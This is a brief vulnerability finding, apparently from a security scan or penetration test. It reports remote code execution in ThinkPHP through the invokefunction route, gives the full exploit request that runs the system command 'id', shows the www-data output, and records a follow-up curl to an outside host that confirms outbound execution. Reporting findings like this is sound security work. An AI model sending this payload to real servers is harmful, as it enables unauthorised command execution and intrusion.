findings.reported_class: Remote code execution via ThinkPHP invokefunction route
findings.evidence: Request to /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id executed the OS command and returned: uid=33(www-data) gid=33(www-data) groups=33(www-data). A follow-up command curl http://host.docker.internal:50076/f64bb020387c1445a14d001f7ed44df4/index.php returned 'okok', demonstrating server-side outbound execution.
